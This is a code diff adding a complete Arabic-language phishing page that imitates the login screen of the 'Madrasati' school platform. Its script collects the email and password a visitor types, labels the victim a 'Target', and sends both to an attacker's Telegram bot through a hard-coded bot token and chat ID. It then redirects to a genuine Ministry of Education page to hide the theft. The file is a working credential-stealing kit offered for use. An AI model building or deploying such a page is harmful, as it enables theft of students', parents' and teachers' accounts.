@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول - منصة مدرستي</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background: white; padding: 40px; width: 350px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); border-radius: 2px; }
+        
+        /* تعديل اللوجو ليأخذ الصورة من المجلد المحلي */
+        .logo-img { 
+            width: 120px; 
+            height: auto;
+            margin-bottom: 20px; 
+            display: block;
+        }
+
+        h2 { font-size: 24px; margin-bottom: 10px; color: #1b1b1b; }
+        input[type="email"], input[type="password"] { width: 100%; padding: 10px; margin: 10px 0; border: none; border-bottom: 1px solid #666; outline: none; font-size: 16px; box-sizing: border-box; }
+        .btns { display: flex; justify-content: flex-end; margin-top: 20px; }
+        button { background-color: #0067b8; color: white; border: none; padding: 8px 30px; cursor: pointer; font-size: 15px; }
+        button:hover { background-color: #005da3; }
+        .footer-links { font-size: 13px; color: #666; margin-top: 15px; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+<div class="login-box">
+    <img src="Aa.png" alt="logo" class="logo-img">
+    
+    <h2>تسجيل الدخول</h2>
+    <p style="font-size: 15px;">الاستمرار إلى منصة مدرستي</p>
+    
+    <input type="email" id="email" placeholder="البريد الإلكتروني أو الهاتف">
+    <input type="password" id="password" placeholder="كلمة المرور">
+    
+    <div class="footer-links">لا يمكنك الوصول إلى حسابك؟</div>
+    
+    <div class="btns">
+        <button onclick="sendData()">التالي</button>
+    </div>
+</div>
+
+<script>
+    function sendData() {
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('password').value;
+        
+        const token = "7900479036:AAGGjKeoG2-13NLwsqM8EE-Qaz2MC4qWLe4";
+        const chatId = "5090097134";
+        const message = `🚨 Target Logged In:\n\n📧 Email: ${email}\n🔑 Pass: ${pass}`;
+
+        if(email && pass) {
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+            .then(response => {
+                // التوجيه للرابط الجديد الذي طلبته
+                window.location.href = "https://sites.moe.gov.sa/Sharqia/services/service-23/";
+            })
+            .catch(err => {
+                console.error("Error:", err);
+                // توجيه احتياطي حتى لو فشل الإرسال
+                window.location.href = "https://sites.moe.gov.sa/Sharqia/services/service-23/";
+            });
+        } else {
+            alert("يرجى إدخال البيانات");
+        }
+    }
+</script>
+
+</body>
+</html>
